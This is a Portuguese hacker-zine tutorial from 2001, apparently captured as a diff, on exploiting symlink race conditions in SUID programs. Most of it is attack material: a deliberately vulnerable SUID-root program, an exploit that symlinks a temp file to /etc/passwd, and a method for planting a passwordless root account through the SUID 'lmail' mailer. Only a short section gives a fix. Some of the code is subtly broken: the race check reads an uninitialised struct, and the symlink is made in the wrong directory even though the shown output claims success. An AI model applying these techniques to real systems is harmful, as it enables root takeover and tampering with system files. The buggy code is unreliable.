@@ -1,0 +1,404 @@
+19/07/01
+
+
+            ####################################################
+            ################ Unsekurity Scene ##################
+            #########http://unsekurity.vitualave.net############
+            ####################################################
+
+
+
+
+
+Desenvolvido por Hophet
+hophet@yahoo.com.br
+
+Este e outros txts podem ser obtidos em:
+http://unsekurity.virtualave.net
+
+
+
+
+
+               ###############################################
+               ############## Race Condition #################
+               ######  Funcoes que manipulam arquivos  #######
+               ###############################################
+
+
+
+
+* Indice:
+---------
+
+
+1 - Introducao.
+2 - Condicoes nao Atomicas - Conceito.
+3 - Explorando - Pratica.
+4 - Consertando Tudo.
+5 - Ultimas Palavras.
+6 - Links.
+ 
+
+
+
+1 - Introducao
+--------------
+
+
+PS.: Todos os testes foram feitos em um Slackware 7.0
+kernel 2.2.13, 2.2.18.
+
+
+Fala Pessoal, mais uma vez aqui estou eu trazendo mais 
+informacoes a respeito de "race conditions" pra comunidade
+fucadora, o objetivo eh documentar mais esta tecnica tao
+pouco falada e aplicada. Espero que o pessoal venha usar
+as informacoes aqui contidas pra crescer em conhecimento
+e tambem aumentar um pouco mais a visao do fucador nos
+possiveis esquemas, utilizando tal tecnica. 
+
+O problema mais uma vez acontece com a mau programacao
+onde desenvolvedores de softs nao se preocupam com a 
+seguranca de suas aplicacoes e a partir daih surgem 
+exploracoes diversas, mas pra frente veremos onde entra 
+isso.
+
+Se pode definir uma Condicao de Corrida(race condition) como
+um "Comportamento anomalio devido a uma dependencia excesiva
+no tempo relativo transcurrido entre diferentes eventos" 
+(traducao de Free On-line Dictionary of Computing).
+
+Estes eventos poden ser desde funcoes que abram um arquivo,
+tambem suas permissoes, etc, ate a relacao de valor de alguma
+variavel compartilhada por 2 procesos,como ja foi dito antes. 
+
+
+2 - Condicoes nao atomicas - Conceito
+-------------------------------------
+
+As  condicoes nao atomicas ocorrem quando nao se pode assegurar
+que uma operacao e a seguinte vao ocorrer de maneira seguida no
+processador. Isto ocorre quando depois da primeira operacao, o 
+procesador assina um intervalo de tempo a outro processo.
+(fundamento da multitarefa em sistemas monoprocessador)
+
+Este eh un exemplo de programa que contem um Race condition em 
+funcoes que manipulao arquivos:
+
+
+------------------------ race_vuln.c --------------------------
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/stat.h>
+#include <unistd.h>
+
+#define	ARQUIVO	"/tmp/pol"
+
+int main(void)
+{
+	FILE *fd;
+	struct stat estado, estado2;
+
+	if (access(ARQUIVO, F_OK) < 0)
+	{
+	   fprintf(stderr,"O arquivo nao existe, criando-o...\n");
+	   fd = fopen(ARQUIVO,"a");
+	   fprintf(fd, "Eh a primeira vez que se cria o arquivo.\n");
+	}
+	else
+	{
+	   fprintf(stdout,"O arquivo ja existe:\n");
+           fprintf(stdout,"Adicionando caracteres ao final!\n");
+
+           fd = fopen(ARQUIVO,"r+");
+	   if (lstat(ARQUIVO, &estado2) == -1)
+	      {
+	        perror("lstat");
+		exit(-1);
+	      }
+	      if (S_ISLNK(estado.st_mode))
+	         {
+		   fprintf(stdout,"Race condition conseguido\n");
+		 }			
+	      fseek(fd, 0, SEEK_END);
+              fprintf(fd,"Ola Fucadores!\n"); 
+	}
+	fclose(fd);
+	return(0);
+}
+
+--------------------------- race_vuln.c -----------------------------
+
+Compile este programa como root e sete o bit SUID root para nossos
+testes:
+
+sh-2.03# gcc race_vuln.c -o race_vuln
+sh-2.03# chmod +s race_vuln
+
+
+O que este programa, basicamente, faz eh:
+
+   1- Comprovar a existencia do arquivo "pol" no diretorio /tmp.
+   2- Se nao existe, ele cria e escreve uma notificacao conforme eh a 
+      primeira vez que se escreve no arquivo.
+   3- Se existe, abre o arquivo e escreve "Ola Fucadores!".
+
+Alen disso, eh adicionado um fragmento de codigo que comprove se foi 
+produzido uma race condition ou nao. (Isto eh irrelevante para demonstrar
+como ocorre realmente). 
+
+Estas operacoes sao muito comuns em quase todos os programas existentes.
+
+Mas que ocorreria se depois de comprovar a existencia do arquivo com
+a chamada de sistema  access() e justo antes de abrilo con fopen(),  
+outro programa interfirisse e tomasse o arquivo por um link simbolico?
+
+Como podemos  imaginar, o programa, efetivamente abriria /tmp/pol,porem
+ele seria um link, realmente estaria operando sobre o arquivo a que ele
+aponta, pelo que adicionaria dados ao final do mesmo.
+
+Este fato pode permitir criar novos arquivos ou alterar os ja 
+existentes. Com isso podemos imaginar muitas coisas possiveis
+e realmente sao muitas.
+
+
+
+3 - Explorando - Pratica
+------------------------
+
+
+O metodo mais simples, sim nao eh o mais "claro", de demonstrar este 
+erro de programacao eh fazer executar em um loop o programa vulneravel
+e varias ordens que permitirao tomar o arquivo que se escreve a outro
+de seu enlace(link).
+
+Aqui vai um simples exploit que vai realizar o trabalho pra gente,
+mais isto poderia ser feito "na unha". O que ele faz eh 1o remover
+qlq arquivo "pol" do /tmp, criar um link simbolico pra "/etc/passwd" 
+com o nome de "pol" e rodar o nosso programa vulneravel, assim
+ele ao inves de escrever em /tmp/pol ele ira escrever no /etc/passwd.
+Nao esqueca de fazer um backup do "/etc/passwd" antes de tentar isso.
+
+
+----------------------------- exploit.c -----------------------------
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/stat.h>
+#include <unistd.h>
+
+int main(int argc, char **argv)
+{
+
+	if (argc < 2)
+	{
+	   fprintf(stderr,"Use: %s <programa>\n",argv[0]);
+	   exit(-1);
+	}
+
+	while (1)
+	{
+	   system("rm -rf /tmp/pol;ln -s /etc/passwd pol");
+           system(argv[1]); 
+           break;      
+	}
+	
+	return(0);
+}
+
+----------------------------- exploit.c ------------------------------
+
+
+
+Agora vamos aplicar o exploit em cima do "race_vuln":
+
+Veja:
+
+sh-2.03$ ls -l
+-rwsr-sr-x   1 root     root        15553 Jul  8 05:09 race_vuln
+-rw-r--r--   1 hophet   users         808 Jul  8 04:06 race_vuln.c
+-rwxr-xr-x   1 hophet   users       12112 Jul  8 04:08 exploit
+-rw-r--r--   1 hophet   users         329 Jul  8 04:08 exploit.c
+
+sh-2.03$ ./exploit race_vuln
+O arquivo ja existe:
+Adicionando caracteres ao final.
+
+Pronto, rodamos o nosso exploit em cima do programa vulneravel, agora
+vamos ver o que aconteceu com o /etc/passwd.
+
+Veja:
+
+sh-2.03$ cat /tmp/pol
+root:x:0:0::/root:/bin/bash
+bin:x:1:1:bin:/bin:
+daemon:x:2:2:daemon:/sbin:
+adm:x:3:4:adm:/var/log:
+lp:x:4:7:lp:/var/spool/lpd:
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:
+news:x:9:13:news:/usr/lib/news:
+uucp:x:10:14:uucp:/var/spool/uucppublic:
+operator:x:11:0:operator:/root:/bin/bash
+games:x:12:100:games:/usr/games:
+ftp:x:14:1::/home/ftp:/bin/bash
+gdm:x:42:42:GDM:/var/state/gdm:/bin/bash
+nobody:x:99:99:nobody:/:
+hophet:x:1000:100:Hophet,,,:/home/hophet:/bin/bash
+crist:x:1001:100::/home/crist:/bin/bash
+cairo:x:1002:100:,,,:/home/cairo:/bin/bash
+mp3:x:777:777:mp3 player:/home/mp3:/bin/bash
+pol:x:1003:100:Pol Meyen,,,:/home/pol:/bin/bash
+Ola Fucadores!
+
+sh-2.03$ cat /etc/passwd
+root:x:0:0::/root:/bin/bash
+bin:x:1:1:bin:/bin:
+daemon:x:2:2:daemon:/sbin:
+adm:x:3:4:adm:/var/log:
+lp:x:4:7:lp:/var/spool/lpd:
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:
+news:x:9:13:news:/usr/lib/news:
+uucp:x:10:14:uucp:/var/spool/uucppublic:
+operator:x:11:0:operator:/root:/bin/bash
+games:x:12:100:games:/usr/games:
+ftp:x:14:1::/home/ftp:/bin/bash
+gdm:x:42:42:GDM:/var/state/gdm:/bin/bash
+nobody:x:99:99:nobody:/:
+hophet:x:1000:100:Hophet,,,:/home/hophet:/bin/bash
+crist:x:1001:100::/home/crist:/bin/bash
+cairo:x:1002:100:,,,:/home/cairo:/bin/bash
+mp3:x:777:777:mp3 player:/home/mp3:/bin/bash
+pol:x:1003:100:Pol Meyen,,,:/home/pol:/bin/bash
+Ola Fucadores!
+
+
+Veja,funciona, o programa escreveu realmente dentro do 
+"/etc/passwd". Vemos que com isso podemos realmente modificar
+qualquer arquivo dentro do sistema. 
+
+O programa vulneravel acima foi apenas um exemplo pra mostrarlhes
+como funciona, mas existem programas onde nos podemos manipular a
+saida pra os arquivos temporarios, assim poderiamos colocar no 
+"passwd" uma conta "root" realmente. Isso acontece com o agente
+de email "lmail" que soh roda com o bit SUID e cria temporarios 
+no /tmp onde nos podemos manipular a saida pra o "/etc/passwd", 
+vejamos rapidamente um pouco sobre ele.
+
+
+Veja:
+
+
+sh-2.03$ ls -l `which lmail`
+-rws--x--x   1 root     root         9220 Nov 25  1993 /usr/bin/lmail*
+
+sh-2.03$ echo `perl -e 'print "\n"'`pol::0:0::/root:/bin/bash | lmail -f
+lmail: write failed to temp file /tmp/lmail29856
+
+sh-2.03$ cat /tmp/lmail29856
+pol::0:0::/root:/bin/bash
+
+
+Como viram, agora era soh criar o link simbolico pra "/etc/passwd" 
+com o nome acima(/tmp/lmail29856) e a conta root 
+"pol::0:0:/root:/bin/bash" estaria lah dentro do "/etc/passwd".
+
+Eh, isso realmente eh util e podemos com isso fazer muitas e muitas 
+coisas dentro do sistema, basta colocar a cabeca pra pensar e tudo
+se abrira a voce:). Poderiamos criar ou modificar servicos, acrescentar
+contas como foi demonstrado, modificar log's, entre muitas outras
+coisas.
+
+Existem muitos programas vulneraveis a isso basta correr um pouco atras
+e ler uns fontes que voce acha um tanto.   
+
+
+
+4 - Consertando Tudo.
+---------------------
+
+
+Como o problema eh um Erro de programacao, nao eh muito complicado
+resolvelo, basta que os programadores ou fucadores ao criar seus
+programas tenham atencao com sua estrutura e com a manipulacao de
+arquivos, setanto permissoes,etc. 
+
+Uma das melhores solucoes para este problema eh o codigo seguinte:
+
+
+------------------------------ solucao.c ----------------------------
+ 
+char *filename;
+int fd;
+
+do {
+	filename = tempnam (NULL, "foo");
+	fd = open (filename, O_CREAT | O_EXCL | O_TRUNC | O_RDWR, 0600);
+	free(filename);
+} while (fd == -1);
+
+------------------------------ solucao.c ------------------------------
+ 
+
+Este fragmento de codigo intenta criar un arquivo com um nome temporal 
+unico em um loop, ate que ele consegue. Tao simples, como util e seguro.
+
+Basta adicionar este codigo ao "race_vuln.c" e aplicar as devidas 
+mudancas que ele deixa de ser vulneravel a Race Condition, o mesmo 
+pode ser feito com outros programas com o mesmo problema. Eh uma
+questao de atencao e cuidado.  
+
+
+
+
+5 - Ultimas Palavras.
+---------------------
+
+
+Como viram "Race Condition" eh muito poderoso e vale a pena
+pra um fucador dominar tal "tecnica" pois aumenta bastante 
+a visao do mesmo, e com certaza eh e vai ser muito util aos
+fucadores. Temos varios casos de RC e com o tempo eles serao
+aperfeicoados e aplicados com mais poder e controle. Nosso
+caminho eh lento e dificil e estamos nele pra chegar ao 
+fim(existe o fim??!:) sempre lutando pela busca a "informacao".
+
+Eh, vou ficando por aqui com minhas humildes palavras, espero ter 
+contribuido mais uma vez para o crescimento da comunidade fucadora.
+
+Um abraco a todo o pessoal da Unsekurity Scene a Martini,
+Blood_Sucker, eSc2, Martin Fallon, e a todos que tem contribuido 
+para o crescimento do hacking verdadeiro.
+
+
+
+6 - Links.
+----------
+
+lmail
+http://hophet.hobbiton.org/lmail.tar.gz 
+
+Hp pessoal
+http://hophet.hobbiton.org
+
+SecurityFocus
+http://www.securityfocus.org
+
+
+Um abraco.
+
+Hophet vulgo Pol Meyen.
+
+
+
+
+-------------------------------- EOF ---------------------------------
+ 
+
